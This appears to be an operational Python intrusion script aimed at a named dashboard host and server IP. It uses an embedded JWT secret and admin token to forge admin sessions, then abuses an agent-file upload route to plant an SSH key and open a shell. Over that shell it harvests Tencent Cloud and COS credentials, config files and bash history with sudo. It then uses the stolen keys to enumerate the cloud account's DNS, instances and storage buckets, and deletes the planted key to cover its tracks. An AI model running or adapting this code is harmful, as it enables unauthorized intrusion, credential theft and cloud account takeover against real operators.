#!/usr/bin/env python3
# i29274: land shell on 122.51.1.87 via dashboard files-RPC local-fallback (same as fact#29264),
# harvest Tencent Cloud IMDS (169.254.0.23) cam/security-credentials, then enumerate the Tencent
# account with the temp creds (CVM/VPC/CLB/CDB/TKE/SSM/COS) to locate zoofi-index origin / DSN / .env.
import os, sys, json, time, base64, hmac, hashlib, subprocess, re
import urllib.parse as up
import urllib.request, urllib.error, ssl, datetime

HOST = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
TARGET = "122.51.1.87"
KEY = "/tmp/ak29274"
START = time.time()

def _b(s):
    if not isinstance(s, str):
        s = json.dumps(s, ensure_ascii=False, default=str)
    return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v):
    print("R:%s:%s" % (k, _b(v)), flush=True)
def run(args, timeout=60):
    try:
        p = subprocess.run(args, capture_output=True, timeout=timeout)
        return p.returncode, p.stdout, p.stderr
    except Exception as e:
        return -1, b"", repr(e).encode()

def call(path, method="GET", body=None, session=None, admin=False, timeout=30, maxlen=20000, extra_headers=None):
    url = "https://%s%s" % (HOST, path)
    args = ["curl", "-s", "-k", "-m", str(timeout), "--http2", "-A", UA,
            "-H", "Accept: application/json, text/plain, */*",
            "-w", "\n__CODE__%{http_code}"]
    if session: args += ["-H", "Cookie: session=" + session]
    if admin: args += ["-H", "Authorization: Bearer " + ADMIN_TOKEN]
    for h in (extra_headers or []):
        args += ["-H", h]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += [url]
    rc, out, err = run(args, timeout=timeout + 20)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:maxlen]}

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def forge(user_id, customer="aro", role="admin"):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps({"userId": user_id, "email": "p@x", "customer": customer,
                         "role": role, "iat": now, "exp": now + 86400 * 7}, separators=(",", ":")))
    sig = b64u(hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    return h + "." + p + "." + sig

def jl(s):
    try: return json.loads(s)
    except Exception: return None

def qp(p): return up.quote(p, safe="/")

def ssh(cmd, timeout=90, verbose=False):
    args = ["ssh", "-i", KEY,
            "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
            "-o", "BatchMode=yes", "-o", "IdentitiesOnly=yes",
            "-o", "ConnectTimeout=15"]
    if verbose: args += ["-v"]
    else: args += ["-o", "LogLevel=ERROR"]
    args += ["ubuntu@" + TARGET, cmd]
    return run(args, timeout=timeout + 25)

def parse_sections(txt):
    res = {}; cur = None; buf = []
    for line in txt.splitlines():
        if line.startswith("@@") and line.endswith("@@") and len(line) > 4:
            if cur is not None:
                res[cur] = "\n".join(buf).strip()
            cur = line.strip("@"); buf = []
        else:
            if cur is not None:
                buf.append(line)
    if cur is not None:
        res[cur] = "\n".join(buf).strip()
    return res

# ================= P0 health =================
R("P0_health", call("/api/health", timeout=20))

# ================= P1 list agents & find disconnected ones =================
r = call("/api/admin/agents", admin=True, timeout=45, maxlen=600000)
j = jl(r["body"]) or {}
agents = j.get("agents", []) if isinstance(j, dict) else []
byid = {a.get("id"): a for a in agents if a.get("id")}
R("P1_list", {"code": r["code"], "n": len(agents),
              "sample": [{k: a.get(k) for k in ("id", "name", "customer", "ip", "sshUser", "status")} for a in agents][:80]})

# connected set: for these the upload routes via WS RPC to the REMOTE agent VM (not local fallback)
connected = set()
ca = call("/api/internal/connected-agents", extra_headers=["x-internal-token: " + ADMIN_TOKEN], timeout=20, maxlen=200000)
try:
    cj = jl(ca["body"]) or {}
    arr = cj.get("agents") or cj.get("connected") or cj.get("connectedAgents") or []
    if isinstance(arr, dict): arr = list(arr.values())
    for x in arr:
        if isinstance(x, str): connected.add(x)
        elif isinstance(x, dict): connected.add(x.get("id") or x.get("agentId"))
except Exception:
    pass
R("P1_connected", {"code": ca["code"], "n": len([c for c in connected if c]), "ids": sorted([c for c in connected if c])[:60]})

def score(a):
    cid = a.get("id")
    return (0 if cid not in connected else 1,
            0 if a.get("customer") == "aro" else 1,
            0 if str(a.get("status", "")).lower() == "provisioning" else 1,
            1 if cid == "agent-b8d7ca0b" else 0,
            cid or "")
ordered = sorted([a for a in agents if a.get("id")], key=score)
attempt_order = [a.get("id") for a in ordered[:6]]
if "agent-b8d7ca0b" in byid and "agent-b8d7ca0b" not in attempt_order:
    attempt_order.append("agent-b8d7ca0b")
R("P1_order", attempt_order)

# ================= P3 keygen =================
run(["ssh-keygen", "-t", "ed25519", "-N", "", "-f", KEY, "-q"], timeout=30)
pub = open(KEY + ".pub").read().strip()
R("P3_pub", pub)
open("/tmp/authorized_keys2_29274", "w").write(pub + "\n")

def upload_for(aid, session, path_param, localfile, fname, timeout=60):
    url = "https://%s/api/agents/%s/files/upload?path=%s" % (HOST, aid, qp(path_param))
    args = ["curl", "-s", "-k", "-m", str(timeout), "--http2", "-A", UA,
            "-H", "Cookie: session=" + session,
            "-F", "files=@%s;filename=%s;type=text/plain" % (localfile, fname),
            "-w", "\n__CODE__%{http_code}", url]
    rc, out, err = run(args, timeout=timeout + 20)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:800]}

# ================= P2..P6 try each candidate =================
shell_ok = False
chosen = None
for AID in attempt_order:
    a = byid.get(AID)
    if not a:
        continue
    cust = a.get("customer") or "aro"
    orig = {"ip": a.get("ip"), "sshUser": a.get("sshUser")}
    pr = call("/api/admin/agents", method="PATCH", admin=True,
              body={"id": AID, "host": "127.0.0.1", "ssh_user": "ubuntu"}, timeout=25, maxlen=3000)
    pj = jl(pr["body"]) or {}
    sess = forge("af0a2285-490f-11f1-ac43-525400595be1", customer=cust)
    up = upload_for(AID, sess, "/home/ubuntu/.ssh", "/tmp/authorized_keys2_29274", "authorized_keys2")
    rr = call("/api/admin/agents", method="PATCH", admin=True,
              body={"id": AID, "host": orig.get("ip"), "ssh_user": orig.get("sshUser")}, timeout=25, maxlen=3000)
    rc, out, err = ssh("id; hostname; echo SUDO:$(sudo -n true 2>&1 && echo ok || echo no)", timeout=35, verbose=False)
    ok = (b"uid=" in out)
    R("attempt_" + AID, {"cust": cust, "orig": orig,
                         "patch": {"code": pr["code"], "ip": pj.get("ip"), "sshUser": pj.get("sshUser")},
                         "upload": up, "restore_ip": (jl(rr["body"]) or {}).get("ip"), "ssh_ok": ok,
                         "ssh_out": out.decode("utf-8", "replace")[:400], "ssh_err": err.decode("utf-8", "replace")[-500:]})
    if ok:
        shell_ok = True; chosen = AID; break

R("P6_ssh", {"ok": shell_ok, "chosen": chosen})
if not shell_ok:
    R("P6_result", "NO_SHELL")
    print("NO SHELL", flush=True); sys.exit(0)


# ================= P7 credential harvest (root-600 caddy dnspod env, COS keys, docker, bash_history) =================
harv = r'''
echo "@@DNSPOD_CONF@@"
sudo cat /etc/systemd/system/caddy.service.d/dnspod.conf 2>/dev/null
sudo cat /etc/systemd/system/caddy.service.d/*.conf 2>/dev/null
echo "@@CRED_GREP@@"
sudo grep -rIhaE 'TENCENTCLOUD_SECRET(_ID|_KEY)?[=: ]+[A-Za-z0-9]{6,}|COS_SECRET(_ID|_KEY)?[=: ]+[A-Za-z0-9]{6,}|LUMII_MODERATION_SECRET(_ID|_KEY)?[=: ]+[A-Za-z0-9]{6,}|AKID[A-Za-z0-9]{12,}' /etc /opt/lumii-prod /home/ubuntu /root 2>/dev/null | grep -v node_modules | sort -u | head -120
echo "@@ENVDEV_BAK@@"
sudo cat /home/ubuntu/env.dev.bak-gw-20260812 2>/dev/null | head -120
echo "@@DOCKERCFG@@"
cat /home/ubuntu/.docker/config.json 2>/dev/null
echo "@@BASHHIST@@"
tail -120 /home/ubuntu/.bash_history 2>/dev/null
echo "@@CADDY_FILES@@"
sudo find /etc/caddy /etc/systemd/system -iname '*caddy*' 2>/dev/null | head -30
echo "@@AKID_ETC@@"
sudo grep -rIhaoE 'AKID[A-Za-z0-9]{12,}' /etc /root /opt/lumii-prod 2>/dev/null | sort -u | head -30
echo "@@DONE_HARV@@"
'''
rc, out, err = ssh(harv, timeout=110)
htxt = out.decode("utf-8", "replace")
hsec = parse_sections(htxt)
alltxt = "\n".join(hsec.values())
R("HARV", {"rc": rc, "sections": {k: v[:5000] for k, v in hsec.items()}, "err": err.decode("utf-8", "replace")[-400:]})

def pick(label):
    m = re.search(label + r"[=:'\"\s]{1,4}(AKID[A-Za-z0-9]{10,}|[A-Za-z0-9]{16,40})", alltxt)
    return m.group(1) if m else None

# capture candidate tencent creds (various layouts)
def find_all(prefix):
    vals = {}
    for m in re.finditer(prefix + r"[_A-Z]*(?:ID|KEY|SECRET)?[=:'\"\s]{1,4}([A-Za-z0-9]{10,44})", alltxt):
        vals.setdefault(m.group(1), 0); vals[m.group(1)] += 1
    return vals

sid = None; skey = None; cosid = None; coskey = None
m = re.search(r"TENCENTCLOUD_SECRET_ID[=:'\" ,]*((?:AKID)?[A-Za-z0-9]{16,44})", alltxt)
if m: sid = m.group(1)
m = re.search(r"TENCENTCLOUD_SECRET_KEY[=:'\" ,]*([A-Za-z0-9]{16,44})", alltxt)
if m: skey = m.group(1)
m = re.search(r"COS_SECRET_ID[=:'\" ,]*((?:AKID)?[A-Za-z0-9]{16,44})", alltxt)
if m: cosid = m.group(1)
m = re.search(r"COS_SECRET_KEY[=:'\" ,]*([A-Za-z0-9]{16,44})", alltxt)
if m: coskey = m.group(1)

# dedupe: if same set
R("CRED_FOUND", {"sid": sid, "skey_len": (len(skey) if skey else 0), "cosid": cosid,
                 "coskey_len": (len(coskey) if coskey else 0),
                 "sid_prefix": (sid[:10] + "…" if sid else None)})

if not sid or not skey:
    R("P7_result", "NO_TENCENT_KEY_FOUND")
    ssh("unlink /home/ubuntu/.ssh/authorized_keys2 2>/dev/null; echo CLEANED", timeout=30)
    R("P99_done", "no key"); print("NO KEY", flush=True); sys.exit(0)

# ================= Tencent Cloud API enumeration with harvested key =================
def _sha256hex(s):
    if isinstance(s, str): s = s.encode()
    return hashlib.sha256(s).hexdigest()
def _hmac(key, msg):
    if isinstance(key, str): key = key.encode()
    if isinstance(msg, str): msg = msg.encode()
    return hmac.new(key, msg, hashlib.sha256).digest()

def tc2(service, action, version, region, payload=None, timeout=12, keyid=None, keykey=None):
    SID2 = keyid or sid; SKEY2 = keykey or skey
    payload = payload or {}
    body = json.dumps(payload, separators=(",", ":")) if payload else "{}"
    host = service + ".tencentcloudapi.com"
    ts = int(time.time())
    date = datetime.datetime.utcfromtimestamp(ts).strftime("%Y-%m-%d")
    ct = "application/json; charset=utf-8"
    canonical_headers = "content-type:%s\nhost:%s\nx-tc-action:%s\n" % (ct, host, action.lower())
    signed_headers = "content-type;host;x-tc-action"
    canonical_request = "POST\n/\n\n" + canonical_headers + "\n" + signed_headers + "\n" + _sha256hex(body)
    credential_scope = "%s/%s/tc3_request" % (date, service)
    string_to_sign = "TC3-HMAC-SHA256\n%d\n%s\n%s" % (ts, credential_scope, _sha256hex(canonical_request))
    k_date = _hmac("TC3" + SKEY2, date); k_service = _hmac(k_date, service); k_signing = _hmac(k_service, "tc3_request")
    signature = hmac.new(k_signing, string_to_sign.encode(), hashlib.sha256).hexdigest()
    auth = "TC3-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s" % (SID2, credential_scope, signed_headers, signature)
    headers = {"Authorization": auth, "Content-Type": ct, "X-TC-Action": action,
               "X-TC-Version": version, "X-TC-Timestamp": str(ts), "Host": host}
    if region: headers["X-TC-Region"] = region
    req = urllib.request.Request("https://" + host + "/", data=body.encode(), headers=headers, method="POST")
    try:
        resp = urllib.request.urlopen(req, timeout=timeout, context=ssl._create_unverified_context())
        return json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        try: return json.loads(e.read().decode())
        except Exception: return {"Response": {"Error": {"Code": "HTTP%s" % e.code}}}
    except Exception as e:
        return {"Response": {"Error": {"Code": "EXC", "Message": repr(e)[:120]}}}

def terr2(resp):
    e = (resp or {}).get("Response", {}).get("Error")
    if e: return "%s:%s" % (e.get("Code"), str(e.get("Message", ""))[:80])
    return None

# identity
appid = tc2("cam", "GetUserAppId", "2019-01-16", "", {})
R("P8_identity", {"appid": (appid.get("Response") or {}), "err": terr2(appid)})

# DNSPod domains + records (most likely permission of a dnspod-only sub-account)
dns_errors = []
domains = []
d = tc2("dnspod", "DescribeDomainList", "2021-03-23", "", {"Limit": 200})
er = terr2(d)
if er:
    dns_errors.append({"DescribeDomainList": er})
else:
    for x in (d.get("Response", {}) or {}).get("DomainList", []) or []:
        domains.append({"name": x.get("Name"), "id": x.get("DomainId"), "status": x.get("Status")})
R("P8_dns_domains", {"n": len(domains), "items": domains[:100], "errors": dns_errors})

dns_recs = []
for dm in domains[:40]:
    nm = dm.get("name")
    if not nm: continue
    rr = tc2("dnspod", "DescribeRecordList", "2021-03-23", "", {"Domain": nm, "Limit": 3000})
    er = terr2(rr)
    if er:
        dns_recs.append({"domain": nm, "err": er}); continue
    recs = (rr.get("Response", {}) or {}).get("RecordList", []) or []
    interesting = []
    for r in recs:
        val = "%s %s %s" % (r.get("Name"), r.get("Type"), r.get("Value"))
        if re.search(r"zoofi|index|tunnel|cname|3000|33306|cloudflare|\.workers\.dev|trycloudflare|cfargotunnel", val, re.I):
            interesting.append({"name": r.get("Name"), "type": r.get("Type"), "value": r.get("Value"), "line": r.get("Line"), "status": r.get("Status")})
    dns_recs.append({"domain": nm, "n": len(recs), "interesting": interesting[:60]})
R("P8_dns_records", {"n": len(dns_recs), "items": dns_recs[:50]})

# CVM regions + instances
regions = []
r2 = tc2("cvm", "DescribeRegions", "2017-03-12", "", {})
er = terr2(r2)
if er:
    R("P8_regions", {"err": er})
else:
    regions = [x.get("Region") for x in (r2.get("Response", {}) or {}).get("RegionSet", []) if x.get("Region")]
    R("P8_regions", {"n": len(regions), "regions": regions})

inst = []
for reg in (regions or ["ap-shanghai", "ap-guangzhou", "ap-beijing", "ap-hongkong"]):
    if 880 < (time.time() - START): break
    resp = tc2("cvm", "DescribeInstances", "2017-03-12", reg, {"Limit": 100})
    er = terr2(resp)
    if er:
        inst.append({"region": reg, "err": er}); continue
    rs = resp.get("Response", {}) or {}
    if rs.get("TotalCount"):
        for it in rs.get("InstanceSet", []):
            inst.append({"region": reg, "id": it.get("InstanceId"), "name": it.get("InstanceName"),
                         "state": it.get("InstanceState"), "zone": (it.get("Placement") or {}).get("Zone"),
                         "priv": it.get("PrivateIpAddresses"), "pub": it.get("PublicIpAddresses"),
                         "tags": [{t.get("Key"): t.get("Value")} for t in (it.get("Tags") or [])]})
R("P8_instances", {"n": len(inst), "items": inst[:200]})

# COS list buckets
def cos_auth2(kid, kkey, method, path, params=None):
    st = int(time.time()); sign_time = "%d;%d" % (st - 60, st + 3600); key_time = sign_time
    sign_key = hmac.new(kkey.encode(), key_time.encode(), hashlib.sha1).hexdigest()
    params = params or {}
    enc = lambda v: up.quote(str(v), safe='')
    http_params = "&".join("%s=%s" % (k.lower(), enc(v)) for k, v in sorted(params.items(), key=lambda kv: kv[0].lower()))
    param_list = ";".join(sorted([k.lower() for k in params.keys()]))
    http_string = method.lower() + "\n" + path + "\n" + http_params + "\n\n"
    string_to_sign = "sha1\n" + sign_time + "\n" + hashlib.sha1(http_string.encode()).hexdigest() + "\n"
    sig = hmac.new(sign_key.encode(), string_to_sign.encode(), hashlib.sha1).hexdigest()
    return "q-sign-algorithm=sha1&q-ak=%s&q-sign-time=%s&q-key-time=%s&q-header-list=&q-url-param-list=%s&q-signature=%s" % (kid, sign_time, key_time, param_list, sig)

def cos_get2(kid, kkey, host, path, params=None, timeout=15):
    auth = cos_auth2(kid, kkey, "GET", path, params)
    url = "https://" + host + path
    if params: url += "?" + "&".join("%s=%s" % (k, up.quote(str(v), safe='')) for k, v in params.items())
    req = urllib.request.Request(url, headers={"Authorization": auth}, method="GET")
    try:
        resp = urllib.request.urlopen(req, timeout=timeout, context=ssl._create_unverified_context())
        return resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try: return e.read().decode("utf-8", "replace")
        except Exception: return "HTTP%s" % e.code
    except Exception as e:
        return "EXC:%s" % repr(e)[:120]

cos_info = {}
kid = cosid or sid; kkey = coskey or skey
svc = cos_get2(kid, kkey, "service.cos.myqcloud.com", "/")
cos_info["service_raw"] = svc[:1500]
bl = []
for mm in re.finditer(r"<Bucket>(.*?)</Bucket>", svc, re.S):
    blk = mm.group(1)
    nm = re.search(r"<Name>(.*?)</Name>", blk); loc = re.search(r"<Location>(.*?)</Location>", blk)
    if nm: bl.append({"name": nm.group(1), "loc": (loc.group(1) if loc else "")})
cos_info["buckets"] = bl[:100]
R("P8_cos", cos_info)

ssh("unlink /home/ubuntu/.ssh/authorized_keys2 2>/dev/null; echo CLEANED", timeout=30)
R("P99_done", {"elapsed": int(time.time() - START)})
print("DONE", flush=True)
